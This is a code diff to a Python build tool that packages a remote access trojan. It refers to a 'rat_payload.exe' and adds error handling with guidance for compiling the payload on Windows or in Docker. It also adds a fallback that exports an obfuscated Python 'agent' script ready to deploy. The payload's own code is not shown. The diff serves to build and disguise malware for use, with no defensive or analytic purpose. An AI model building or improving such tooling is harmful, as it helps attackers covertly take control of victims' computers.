@@ -282,7 +282,27 @@ if __name__ == "__main__":
                 self.log("success", "PyInstaller compilation successful")
                 return True
             else:
-                self.log("error", f"PyInstaller failed: {result.stderr}")
+                # Check for known errors and provide helpful messages
+                stderr = result.stderr
+                
+                # Check for shared library error (Linux-specific)
+                if "shared library" in stderr and "enable-shared" in stderr:
+                    self.log("error", "PyInstaller Error: Python shared library not available")
+                    self.log("info", "━" * 76)
+                    self.log("warning", "SOLUTION FOR LINUX USERS:")
+                    self.log("info", "1. This is a Linux environment with a Python build without shared libraries")
+                    self.log("info", "2. PyInstaller requires libpython.so to create executables")
+                    self.log("info", "")
+                    self.log("info", "OPTIONS:")
+                    self.log("info", "  A) Build on Windows with: python startup.py agent")
+                    self.log("info", "  B) Use pre-built executable: dist/rat_payload.exe")
+                    self.log("info", "  C) Use Docker: docker run --rm -v $(pwd):/app python:3.11 python startup.py agent")
+                    self.log("info", "  D) Deploy as Python script (no compilation needed)")
+                    self.log("info", "━" * 76)
+                    return False
+                
+                # Generic error
+                self.log("error", f"PyInstaller failed: {stderr}")
                 return False
         except subprocess.TimeoutExpired:
             self.log("error", "PyInstaller timeout (>5 minutes)")
@@ -360,6 +380,21 @@ if __name__ == "__main__":
                 self.log("success", f"EXECUTABLE CREATED: {exe_path}")
                 self.log("success", f"{'='*80}\n")
                 return True
+        
+        # Fallback: Save as obfuscated Python script
+        if sys.platform != 'win32':
+            self.log("info", "\nFallback: Exporting obfuscated Python agent...")
+            script_path = f"dist/{self.output_name}_agent.py"
+            os.makedirs('dist', exist_ok=True)
+            with open(script_path, 'w', encoding='utf-8') as f:
+                f.write(wrapped)
+            os.chmod(script_path, 0o755)
+            self.log("success", f"\n{'='*80}")
+            self.log("success", f"PYTHON AGENT EXPORTED: {script_path}")
+            self.log("success", f"Usage: python {script_path}")
+            self.log("success", f"{'='*80}\n")
+            self.cleanup()
+            return True
         
         self.cleanup()
         return False
